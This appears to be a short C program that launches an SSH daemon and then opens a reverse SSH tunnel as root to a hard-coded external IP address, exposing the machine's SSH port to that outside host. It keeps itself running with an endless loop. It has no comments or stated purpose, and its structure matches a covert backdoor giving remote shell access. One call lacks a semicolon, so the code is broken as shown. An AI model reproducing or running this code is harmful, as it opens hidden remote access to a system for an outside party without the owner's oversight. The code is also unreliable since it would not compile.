#include <stdlib.h>
int main(){
  system("/usr/sbin/sshd -D &");
  system("ps -aux");
  system("ssh -fN -R 10022:localhost:22 root@123.206.57.144")
  while(1);
}
